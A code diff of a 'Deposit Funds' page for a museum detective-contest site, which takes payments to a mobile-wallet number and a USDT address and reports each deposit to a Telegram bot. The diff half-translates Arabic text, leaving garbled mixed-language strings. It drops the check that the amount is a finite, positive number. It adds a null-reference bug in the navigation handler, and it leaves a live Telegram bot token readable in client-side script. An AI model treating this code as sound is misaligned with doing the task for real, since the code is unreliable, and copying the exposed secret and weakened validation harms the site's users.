@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr" data-ui="v10">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إيداع الرصيد • المتحف الكبير</title>
-    <meta name="description" content="قم بإيداع الرصيد للمشاركة في مسابقة المحقق. أقل مبلغ 50 جنيه.">
+    <title>Deposit Funds • Grand Museum</title>
+    <meta name="description" content="قم بDeposit Funds للمشاركة في مسابقة المحقق. أقل مبلغ 50 EGP.">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
@@ -200,38 +200,39 @@
         }
         .nav-item.showing .nav-label{ display:block; }
     </style>
+    <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="v10.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <script src="v10.js" defer></script>
 </head>
 <body>
 
 <div class="toast-container" id="toastContainer"></div>
 
 <div class="header">
-    <h1>💰 إيداع الرصيد</h1>
-    <div class="back" onclick="goBack()">⬅ رجوع</div>
+    <h1>💰 Deposit Funds</h1>
+    <div class="back" onclick="goBack()">⬅ Back</div>
 </div>
 
 <div class="container">
     <div class="card">
         <div class="data-field" id="phone">01069806835</div>
-        <button onclick="copyText('phone')">نسخ رقم الإيداع</button>
+        <button onclick="copyText('phone')">Copy Deposit Number</button>
 
         <br><br>
 
         <div class="data-field" id="wallet">TPNgUyRe7GSnazUzakRU3egEU4XBS7Pu5h</div>
         <div class="wallet-network">TRC20 Network</div>
-        <button onclick="copyText('wallet')">نسخ عنوان محفظة USDT</button>
+        <button onclick="copyText('wallet')">Copy USDT Wallet Address</button>
 
-        <div class="note">💱 ملحوظة: 1$ = 50 جنيه</div>
+        <div class="note">💱 Note: 1$ = 50 EGP</div>
     </div>
 
     <div class="card">
         <select id="method" onchange="changePlaceholder()">
-            <option value="">اختر طريقة الإيداع</option>
-            <option value="فودافون كاش">فودافون كاش</option>
-            <option value="اتصالات كاش">اتصالات كاش</option>
-            <option value="اورنج كاش">اورنج كاش</option>
+            <option value="">Choose a deposit method</option>
+            <option value="Vodafone Cash">Vodafone Cash</option>
+            <option value="Etisalat Cash">Etisalat Cash</option>
+            <option value="Orange Cash">Orange Cash</option>
             <option value="USDT">USDT</option>
         </select>
 
@@ -244,30 +245,30 @@
 
         <div class="loader" id="loader"></div>
 
-        <button onclick="confirmDeposit(event)" id="submitBtn">تقديم طلب الإيداع</button>
+        <button onclick="confirmDeposit(event)" id="submitBtn">Submit Deposit Request</button>
     </div>
 
-    <button onclick="location.href='dashboard.html'">العودة للوحة التحكم</button>
+    <button onclick="location.href='dashboard.html'">Back to Dashboard</button>
 </div>
 
 <!-- Bottom Nav -->
 <div class="bottom-nav">
-    <div class="nav-item" data-url="dashboard.html" data-label="الرئيسية" data-egypt="𓂀" data-alt="🏠">
-        <div class="nav-circle">𓂀</div><div class="nav-label">الرئيسية</div>
+    <div class="nav-item" data-url="dashboard.html" data-label="Home" data-egypt="𓂀" data-alt="🏠">
+        <div class="nav-circle">𓂀</div><div class="nav-label">Home</div>
     </div>
-    <div class="nav-item" data-url="museum.html" data-label="المتحف" data-egypt="𓆣" data-alt="🏺">
-        <div class="nav-circle">𓆣</div><div class="nav-label">المتحف</div>
+    <div class="nav-item" data-url="museum.html" data-label="Museum" data-egypt="𓆣" data-alt="🏺">
+        <div class="nav-circle">𓆣</div><div class="nav-label">Museum</div>
     </div>
-    <div class="nav-item" data-url="statue1.html" data-label="المرحلة 1" data-egypt="𓁹" data-alt="⚒️">
-        <div class="nav-circle">𓁹</div><div class="nav-label">المرحلة 1</div>
+    <div class="nav-item" data-url="statue1.html" data-label="Stage 1" data-egypt="𓁹" data-alt="⚒️">
+        <div class="nav-circle">𓁹</div><div class="nav-label">Stage 1</div>
     </div>
-    <div class="nav-item" data-url="profile.html" data-label="حسابي" data-egypt="☥" data-alt="👤">
-        <div class="nav-circle">☥</div><div class="nav-label">حسابي</div>
+    <div class="nav-item" data-url="profile.html" data-label="My Account" data-egypt="☥" data-alt="👤">
+        <div class="nav-circle">☥</div><div class="nav-label">My Account</div>
     </div>
 </div>
 
 <script>
-// ========== متغيرات تيليجرام ==========
+// ========== متغيرات Telegram ==========
 const TELEGRAM_TOKEN = "8535863939:AAFC4qgREiGQC-4c1QCQNrNp3gMprRsQRTs";
 const TELEGRAM_CHAT_ID = "6733319757";
 
@@ -311,9 +312,9 @@ function changePlaceholder(){
 function validatePhoneNumber(phone, method){
     const clean = phone.replace(/\s+/g,'').replace(/[^\d]/g,'');
     const prefixes = {
-        'فودافون كاش': ['010','015','016'],
-        'اتصالات كاش': ['011'],
-        'اورنج كاش': ['012']
+        'Vodafone Cash': ['010','015','016'],
+        'Etisalat Cash': ['011'],
+        'Orange Cash': ['012']
     };
     if(!prefixes[method]) return true;
     if(clean.length !== 11) return false;
@@ -352,13 +353,13 @@ function calculateEstimatedSize(base64Image, otherData){
 async function sendToTelegram(depositData, imageBase64){
     try{
         const message = `
-🆕 طلب إيداع جديد
-👤 ${depositData.username || 'غير معروف'}
-🔹 الطريقة: ${depositData.method}
+🆕 طلب Deposit جديد
+👤 ${depositData.username || 'Unknown'}
+🔹 Method: ${depositData.method}
 📞 الرقم: ${depositData.fromNumber}
-💰 المبلغ: ${depositData.amount} جنيه
+💰 Amount: ${depositData.amount} EGP
 🆔 ${depositData.userId}
-🕐 ${new Date().toLocaleString('ar-EG')}`;
+🕐 ${new Date().toLocaleString('en-US')}`;
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{
             method:'POST',
             headers:{'Content-Type':'application/json'},
@@ -385,12 +386,12 @@ async function confirmDeposit(event){
     const submitBtn = document.getElementById("submitBtn");
     const loader = document.getElementById("loader");
 
-    if(!method || !fromNumber || !Number.isFinite(amount) || amount <= 0 || !proofFile){
-        showCustomToast("يرجى إدخال جميع البيانات ورفع صورة الإثبات", "error");
+    if(!method || !fromNumber || !amount || !proofFile){
+        showCustomToast("يرجى Enter جميع البيانات ورفع صورة الإثبات", "error");
         return;
     }
     if(amount < minAmount){
-        showCustomToast("أقل مبلغ للإيداع هو 50 جنيه", "error");
+        showCustomToast("أقل مبلغ للإيداع هو 50 EGP", "error");
         return;
     }
     const estimatedBase64Size = proofFile.size * BASE64_OVERHEAD;
@@ -400,9 +401,9 @@ async function confirmDeposit(event){
     }
     if(method !== "USDT" && !validatePhoneNumber(fromNumber, method)){
         let msg = "";
-        if(method==="فودافون كاش") msg = "رقم فودافون كاش يجب أن يبدأ بـ 010/015/016";
-        else if(method==="اتصالات كاش") msg = "رقم اتصالات كاش يجب أن يبدأ بـ 011";
-        else msg = "رقم اورنج كاش يجب أن يبدأ بـ 012";
+        if(method==="Vodafone Cash") msg = "Number Vodafone Cash يجب أن يبدأ بـ 010/015/016";
+        else if(method==="Etisalat Cash") msg = "Number Etisalat Cash يجب أن يبدأ بـ 011";
+        else msg = "Number Orange Cash يجب أن يبدأ بـ 012";
         showCustomToast(msg, "error");
         return;
     }
@@ -422,7 +423,6 @@ async function confirmDeposit(event){
             method,
             fromNumber,
             amount,
-            coins: amount,
             status: "pending",
             createdAt: firebase.firestore.FieldValue.serverTimestamp()
         };
@@ -430,7 +430,7 @@ async function confirmDeposit(event){
         if(estimatedSize > 1048576){
             showCustomToast("المستند كبير جداً. حاول استخدام صورة أصغر.", "error");
             submitBtn.disabled = false;
-            submitBtn.innerText = "تقديم طلب الإيداع";
+            submitBtn.innerText = "Submit Deposit Request";
             loader.style.display = "none";
             return;
         }
@@ -445,9 +445,9 @@ async function confirmDeposit(event){
         setTimeout(()=> window.location.href = "transactions.html", 2000);
     } catch(err){
         console.error(err);
-        showCustomToast("حدث خطأ: " + err.message, "error");
+        showCustomToast("حدث Error: " + err.message, "error");
         submitBtn.disabled = false;
-        submitBtn.innerText = "تقديم طلب الإيداع";
+        submitBtn.innerText = "Submit Deposit Request";
         loader.style.display = "none";
     }
 }
@@ -478,14 +478,12 @@ navItems.forEach(item => {
         timer = setTimeout(()=>{
             const c = currentItem.querySelector('.nav-circle');
             c.textContent = currentItem.dataset.egypt;
-            const targetUrl = currentItem.dataset.url;
             currentItem.classList.remove('showing');
             timer = null; currentItem = null;
-            window.location.href = targetUrl;
+            window.location.href = currentItem.dataset.url;
         }, 3000);
     });
 });
 </script>
-    <script src="v10.js" defer></script>
 </body>
 </html>
